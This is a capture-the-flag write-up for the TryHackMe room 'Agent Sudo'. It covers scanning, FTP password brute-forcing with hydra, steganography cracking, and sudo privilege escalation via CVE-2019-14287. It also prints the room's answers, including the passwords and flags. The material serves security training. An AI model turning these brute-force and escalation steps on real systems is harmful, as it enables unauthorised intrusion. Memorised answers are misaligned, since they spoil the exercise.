# Agent Sudo

![AgentSudo](./images/AgentSudo.png)

[Agent Sudo](https://tryhackme.com/r/room/agentsudoctf) is listed as an easy room, and covers a lot of different tools and aspects of security, which makes it a great room to complete for beginners.
An overview of what we’ll be using is listed here:  

* Basic linux commands
* Nmap scan
* Gobuster
* Hydra
* Binwalk
* John
* Stegcracker
* Steghide

## Task 1 - Author note

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

```
export IP=10.10.218.33
```

![IP](./images/IP.png)

## Task 2 - Enumerate

Enumerate the machine and get all the important information

### Try to open IP from browser

![task2-browser](./images/task2-browser.png)

### Scan open port with nmap

```
nmap -sV -sC -oN nmap-scan $IP
```

File scan resulted [here](./files/nmap-scan)

![task2-nmap-scan](./images/task2-nmap-scan.png)

### Scan directory with gobuster

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u $IP | tee gobuster-default.txt
```

![task2-gobuster-default](./images/task2-gobuster-default.png)

### Change user-agnet

We get information from website, that we must change codename as user-agent to access the site. 

* Install User-Agent Switcher on Firefox browser

	![task2-firefox](./images/task2-firefox.png)

* Set User-Agent Codename

	![task2-codename](./images/task2-codename.png)

* Reopen website with user-agent

	![task2-user-agent](./images/task2-user-agent.png)

### Answer the questions

* How many open ports?

	`3`

* How you redirect yourself to a secret page?

	`user-agent`

* What is the agent name?

	`chris`

## Task 3 - Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

### Brute Force FTP with hydra

```
hydra -l chris -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ftp://$IP
```

![task3-ftp-password](./images/task3-ftp-password.png)

### Login to ftp server

```
ftp chris@$IP
```

![task3-login-ftp](./images/task3-login-ftp.png)

### Download file from ftp server

![task3-getfile-ftp](./images/task3-getfile-ftp.png)


List of files:  
[To_agentJ.txt](./files/To_agentJ.txt)  
[cute-alien.jpg](./files/cute-alien.jpg)  
[cutie.png](./files/cutie.png)  


### Trying hidden zip file from image

```
binwalk -e cute-alien.jpg
binwalk -e cutie.png
```

![task3-binwalk](./images/task3-binwalk.png)

### Extract zip file from image

```
binwalk -e cutie.png
```

![task3-binwalk-extract](./images/task3-binwalk-extract.png)

Extraxted file [here](./files/_cutie.png.extracted)

![task3-file-extract](./images/task3-file-extract.png)

### Crack password zip with John

```
zip2john 8702.zip > john-8702.zip
john john-8702.zip
```

![task3-john](./images/task3-john.png)

### Zip extract

![task3-zip-extract](./images/task3-zip-extract.png)

Read file

![task3-agent-txt](./images/task3-agent-txt.png)

### Steg password Crack

```
stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt
```

![task3-stegcracker](./images/task3-stegcracker.png)

### Steg hidden message

```
steghide extract -sf cute-alien.jpg
```

File hidden message [here](./files/message.txt)

![task3-steghide](./images/task3-steghide.png)

### Answer the questions

* FTP password

	`crystal`

* Zip file password

	`alien`

* steg password

	`Area51`

* Who is the other agent (in full name)?

	`James`

* SSH password

	`hackerrules!`

## Task 4 - Capture the user flag

### Login to target machine

![task4-login](./images/task4-login.png)

### Get the user_flag

![task4-user-flag](./images/task4-user-flag.png)

### Download image from target machine

```
scp james@10.10.8.171:/home/james/Alien_autospy.jpg .
```

![task4-scp](./images/task4-scp.png)

File image [here](./files/Alien_autospy.jpg)

### Search image file from google

![task4-image-search](./images/task4-image-search.png)

### Answer the questions

* What is the user flag?

	`b03d975e8c92a7c04146cfa7a5a313c7`

* What is the incident of the photo called?

	`Roswell Alien Autopsy`

## Task 5 -Privilege escalation

### Sudo -l

* Check sudo version 

	![task5-sudo](./images/task5-sudo.png)

* Check sudo version on Exploit DB

	![task5-sudo-version](./images/task5-sudo-version.png)

* Download Exploit Script

	Searchsploit

	![task5-searchsploit](./images/task5-searchsploit.png)

	Download exploit

	![task5-download](./images/task5-download.png)

### Transfer and Run Exploit

* Transfer exploit file to target machine

	Make a simple HTTP server from our machine

	![task5-http-server](./images/task5-http-server.png)

	Download file from target machine

	![task5-wget](./images/task5-wget.png)

* Run Exploit

	Set script file executable

	![task5-chmod](./images/task5-chmod.png)

	Run script

	![task5-run-script](./images/task5-run-script.png)

* Get Root Flag

	![task5-root-txt](./images/task5-root-txt.png)


### Answer the questions

* CVE number for the escalation

	`CVE-2019-14287`

* What is the root flag?

	`b53a02f55b57d4439e3341834d70c062`

* (Bonus) Who is Agent R?

	`DesKel`
